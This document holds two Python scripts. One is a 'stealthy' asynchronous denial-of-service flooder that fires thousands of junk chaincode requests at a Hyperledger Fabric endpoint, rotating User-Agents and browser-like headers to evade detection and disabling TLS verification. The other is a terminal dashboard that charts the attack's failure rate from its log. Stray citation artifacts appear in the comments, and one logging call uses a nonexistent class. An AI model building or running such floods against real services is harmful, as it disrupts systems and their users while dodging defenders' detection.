import asyncio
import json
import random
import string
import time
import logging
from datetime import datetime
import sys
import ssl

import aiohttp

# --- Configuration ---
FABRIC_URL = "https://localhost:7051"
CHANNEL_ID = "mychannel"
CHAINCODE_ID = "mycc"

# Attack parameters
TOTAL_TRANSACTIONS = 5000
CONCURRENT_REQUESTS = 100
ATTACK_TIMEOUT_SECONDS = 15

# --- Logging Setup ---
LOG_FILE = "dos_stealthy_flood.log" # Consistent log file name
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s', # Added brackets for easier parsing
    handlers=[
        logging.FileWriter(LOG_FILE),
    ]
)
logger = logging.getLogger(__name__)

# --- User-Agent Pool ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46",
]

# --- Attack Logic ---
def generate_malformed_payload() -> str:
    """Generates a varied JSON payload."""
    fcn = random.choice(["invalidDiscardFunction", "doNothing", "processJunk"])
    random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
    return json.dumps({"fcn": fcn, "args": [random_data]})

async def send_transaction(session: aiohttp.ClientSession, url: str, stats: dict):
    """
    Sends a single transaction with randomized, realistic headers to bypass detection.
    """
    try:
        payload = generate_malformed_payload()
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        async with session.post(url, data=payload, headers=headers, timeout=ATTACK_TIMEOUT_SECONDS) as response:
            status = response.status
            async with stats['lock']:
                stats['sent'] += 1
            logger.info(f"Sent request. Status: {status}")

    except asyncio.TimeoutError:
        async with stats['lock']:
            stats['failed'] += 1
        # --- MODIFICATION: Add a specific tag for failures ---
        logger.warning("Request timed out. [FAILURE]")
    except aiohttp.ClientError as e:
        async with stats['lock']:
            stats['failed'] += 1
        # --- MODIFICATION: Add a specific tag for failures ---
        logger.warning(f"Request failed: {e}. [FAILURE]")

async def progress_reporter(stats: dict, stop_event: asyncio.Event):
    """Prints progress to the console without blocking the event loop."""
    while not stop_event.is_set():
        async with stats['lock']:
            sent = stats['sent']
            failed = stats['failed']
        sys.stdout.write(f"\rTotal Sent: {sent}, Total Failed: {failed}")
        sys.stdout.flush()
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=2.0)
        except asyncio.TimeoutError:
            continue

async def run_dos_attack():
    """Main async function to orchestrate the attack."""
    print("="*50)
    print(">>> STARTING STEALTHY DOS ATTACK (ASYNC) <<<")
    print("="*50)
    print(f"Target URL: {FABRIC_URL}")
    print(f"Log File: {LOG_FILE}")
    print(f"Total Transactions to Send: {TOTAL_TRANSACTIONS}")
    print(f"Concurrent Requests: {CONCURRENT_REQUESTS}")
    print("-"*50)
    print("Run 'python attack_monitor.py' in another terminal to see live stats.")
    print("="*50)

    url = f"{FABRIC_URL}/channels/{CHANNEL_ID}/chaincodes/{CHAINCODE_ID}"
    stats = {'sent': 0, 'failed': 0, 'lock': asyncio.Lock()}
    start_time = datetime.now()
    
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    connector = aiohttp.TCPConnector(
        limit=CONCURRENT_REQUESTS, 
        force_close=True,
        ssl=ssl_context
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        stop_event = asyncio.Event()
        reporter_task = asyncio.create_task(progress_reporter(stats, stop_event))

        for i in range(TOTAL_TRANSACTIONS):
            task = asyncio.create_task(send_transaction(session, url, stats))
            tasks.append(task)
            
            if len(tasks) >= CONCURRENT_REQUESTS:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending)

        if tasks:
            await asyncio.wait(tasks)
        
        stop_event.set()
        await reporter_task

    end_time = datetime.now()
    duration = end_time - start_time
    print("\n" + "-"*50)
    print(">>> ALL REQUESTS COMPLETED <<<")
    print(f"Attack finished. Total duration: {duration}")
    async with stats['lock']:
        final_sent = stats['sent']
        final_failed = stats['failed']
    print(f"Final Tally - Total Sent: {final_sent}, Total Failed: {final_failed}")
    print("="*50)
    print(">>> ATTACK FINISHED <<<")
    print("="*50)

if __name__ == "__main__":
    try:
        asyncio.run(run_dos_attack())
    except KeyboardInterrupt:
        print("\n!!! ATTACK INTERRUPTED BY USER !!!")
    except Exception as e:
        print(f"\n!!! UNHANDLED ERROR IN MAIN SCRIPT: {e} !!!")
        logger.error("Unhandled error in main script", exc_info=True)




-------------------

import asyncio
from pathlib import Path

from textual.app import App, ComposeResult
from textual.containers import Container
from textual.widgets import Header, Footer, Static

import plotext as plt

# --- Configuration ---
# This MUST match the log file name used in your attack script.
LOG_FILE = "dos_stealthy_flood.log"
# How many seconds of data to display on the chart.
MAX_POINTS_ON_CHART = 60


class PlotDisplay(Static):
    """A widget to display the plotext chart."""

    def render_chart(self, data_points: list[int]) -> None:
        """Render the chart using plotext and show it in this widget."""

        # Don't draw if there's not enough data yet
        if not data_points or len(data_points) < 2:
            self.update("Waiting for data...")
            return

        try:
            # --- Configure plotext ---
            plt.clear_data()  # clear previous series
            plt.theme("dark")
            plt.title("Real-Time Failure Rate")
            plt.xlabel("Time (seconds ago)")
            plt.ylabel("Failures / Sec")

            x_values = list(range(len(data_points)))
            plt.plot(x_values, data_points, marker="braille", label="Failures")

            # Build the canvas without dumping to the real terminal
            # In recent plotext versions the recommended combo is show(hide=True)
            # followed by get_canvas() to get the plot as a string. :contentReference[oaicite:0]{index=0}
            plt.show(hide=True)
            plot_text = plt.get_canvas()

            # --- Render the plot in the widget ---
            self.update(plot_text)

        except Exception as e:
            self.update(f"Error rendering plot: {e}")


class AttackMonitor(App):
    """A Textual app to monitor the DoS attack log file."""

    CSS = """
    Screen {
        layout: vertical;
    }

    Container {
        height: 1fr;
    }

    PlotDisplay {
        height: 100%;
        width: 100%;
        border: solid $primary;
        padding: 1 1;
    }
    """

    def compose(self) -> ComposeResult:
        """Compose the UI."""
        yield Header()
        with Container():
            # Initial text for the plot area
            yield PlotDisplay("Initializing...")
        yield Footer()

    async def on_mount(self) -> None:
        """Called when the app is mounted."""
        # Start the background task to monitor the log file.
        # Important: pass an *awaitable* into run_worker, not the function itself.
        # This is the current pattern in the Textual worker docs. :contentReference[oaicite:1]{index=1}
        self.run_worker(self.monitor_log(), exclusive=True)

    async def monitor_log(self) -> None:
        """Monitors the log file and updates the chart."""
        log_path = Path(LOG_FILE)
        failure_counts: list[int] = []
        last_position = 0

        plot_widget = self.query_one(PlotDisplay)

        # Wait for the log file to be created by the attack script
        while not log_path.exists():
            plot_widget.update(f"Waiting for log file '{LOG_FILE}'...")
            await asyncio.sleep(2)

        while True:
            failures_this_second = 0

            try:
                with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
                    # Seek to the last known position
                    f.seek(last_position)

                    # Read new lines
                    new_lines = f.readlines()

                    # Update the last known position
                    last_position = f.tell()

                    # Count failures in the new lines
                    for line in new_lines:
                        if "[FAILURE]" in line:
                            failures_this_second += 1

            except FileNotFoundError:
                # Log file was deleted, reset and wait
                last_position = 0
                failure_counts.clear()
                plot_widget.update("Log file not found, waiting...")
                await asyncio.sleep(2)
                continue

            # Add the count for this second to our list
            failure_counts.append(failures_this_second)

            # Keep the chart from getting too crowded
            if len(failure_counts) > MAX_POINTS_ON_CHART:
                failure_counts.pop(0)

            # Update the chart display
            plot_widget.render_chart(failure_counts)

            # Wait for 1 second before the next check
            await asyncio.sleep(1)


if __name__ == "__main__":
    app = AttackMonitor()
    app.run()

